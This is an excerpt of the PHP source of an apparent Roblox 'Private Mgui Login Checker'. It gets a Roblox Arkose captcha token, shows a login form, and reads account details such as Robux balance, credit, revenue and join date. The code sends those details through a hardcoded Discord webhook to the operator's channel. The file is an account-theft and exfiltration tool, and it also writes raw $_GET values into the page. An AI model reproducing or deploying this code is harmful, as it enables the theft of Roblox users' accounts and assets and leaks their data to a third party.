...
$data = array(
  ...
  "rnd" => "0.{random.choice('12334565789')}"
);
$response = Requests::post("https://roblox-api.arkoselabs.com/fc/gt2/public_key/476068BF-9607-4799-B53D-966BE98E2B81", $headers, $data);
$responsearray = json_decode($response->body, true);
$captchatoken = $responsearray["token"];
...
<style>
body {
  background-image: url('https://cdn.discordapp.com/attachments/731109494385410078/733220201092481044/mSDiUQ.png');
	...
	<header>
		<div class="main">
			<center>
				...
				<h1>Private Mgui Login Checker</h1>
									<?php
if ($_SERVER["REQUEST_METHOD"]=="GET") {
echo '<iframe src="https://client-api.arkoselabs.com/fc/gc/?token='.str_replace('|','&',$captchatoken).'" width=306, height=260></iframe>
<form method="POST">
	...
	<input type="hidden" name="success" id="success" value='.$_GET["success"].'>
    <input type="hidden" name="failed" id="failed" value='.$_GET["failed"].'>
	
    <input type="submit" class="button button4" value="Validate!">
</form>';} else {
    echo '<script>
...
$timestamp = date("c", strtotime("now"));  
   ...
   $id = $user->{'Id'};
$log = "https://discord.com/api/webhooks/789491018893361153/GhwKNJ1nGrq5_e0FpRXGLulJO7o4P2UDFNhpJLznXWCClbYYWIj9K82lTQ9rkMnFFwjw";
$embed = json_encode([
    "content" => "",
    "username" => "James Mgui",
    "avatar_url" => "https://cdn.discordapp.com/attachments/789078608764338177/789287268899880970/48a1bc28e8d5be5e59bef1c3124ee896.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => "",
            "type" => "rich",
            "description" => "[**Account Profile**](https://web.roblox.com/users/$userid/profile)\n\n**Robux**: `R$ $robux`\n**Credit**: `$credit`\n**Revenue**: `R$ $totalrobux`\n**Join Date**: `$new_date`)",
            "url" => "",
            "color" => hexdec( "#00ff00" ),
            "timestamp" => $timestamp,
            "image" => [
            ...
            "thumbnail" => [
                "url" => "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid=$id"
            ],
            "author" => [
                "name" => "Auto - Checker",
                "url" => "",
...
curl_close( $ch );
 ...
 echo 'Swal.fire({
      icon: "success",
      title: "Successfully Logged Check The Information In Your Channel!",
    })';
           echo '</script>';
		   echo '<iframe src="https://client-api.arkoselabs.com/fc/gc/?token='.str_replace('|','&',$captchatoken).'" width=306, height=260></iframe>
<form method="POST">
